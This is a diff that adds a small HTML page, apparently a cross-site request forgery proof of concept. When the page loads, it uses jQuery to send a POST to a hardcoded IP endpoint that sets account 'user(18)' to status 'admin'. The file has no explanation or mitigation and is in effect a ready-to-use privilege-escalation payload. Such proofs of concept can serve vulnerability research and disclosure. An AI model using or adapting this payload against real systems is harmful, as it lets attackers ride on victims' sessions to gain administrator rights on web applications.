@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <script src="https://cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
+    </head>
+    <body>
+        <script type="text/javascript">
+            $.ajax({
+              type: 'POST',
+              url: 'http://39.106.9.139/apis/restful/set/_account/user(18)',
+              data: {"status":"admin"},
+              success: function(data){
+                console.log(data)
+              }
+            });
+        </script>
+    </body>
+</html>
